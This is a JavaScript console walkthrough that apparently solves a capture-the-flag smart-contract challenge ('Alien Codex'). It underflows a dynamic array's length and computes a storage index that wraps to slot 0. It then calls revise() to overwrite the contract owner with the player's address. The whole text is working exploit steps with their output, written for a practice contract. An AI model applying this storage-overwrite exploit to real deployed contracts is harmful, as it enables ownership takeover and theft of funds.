```js
await contract.owner()
// '0x0BC04aa6aaC163A6B3667636D798FA053D43BD11'
await web3.eth.getStorageAt(contract.address, 0) // "contact" bool . "owner" address
// '0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
// '0x0000000000000000000000000000000000000000000000000000000000000000'
await web3.eth.getStorageAt(contract.address, 2) // "codex" array length
// '0x0000000000000000000000000000000000000000000000000000000000000000'

// Passing the modifer assert.
await contract.makeContact()
await web3.eth.getStorageAt(contract.address, 0)
// '0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'

// Overflowing array length
await contract.retract()
await web3.eth.getStorageAt(contract.address, 1)
// '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001')
// '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
web3.utils.BN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
    .sub(web3.utils.BN('0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'))
    .toString(16).padStart(66, "0x")
// '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f309'

// In order to overflow to the slot number "0" we need to add 1 to the last result, i.e:
// '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'

await contract.revise(
    '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a',
    `0x000000000000000000000001${player.slice(2)}`,
)
```
